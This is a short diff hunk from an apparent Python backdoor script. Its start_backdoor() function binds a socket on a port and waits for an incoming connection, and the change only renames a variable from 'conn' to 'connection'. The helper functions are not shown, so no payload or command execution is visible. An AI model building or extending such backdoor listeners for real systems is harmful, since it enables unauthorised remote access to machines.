@@ -30,7 +30,7 @@ def start_backdoor():
     valid, port = bind()
     if valid:
         print(f'Socket bind complete on port {port}. Waiting for connection...')
-    conn = connect()
+    connection = connect()
 
 if __name__ == "__main__":
     start_backdoor()
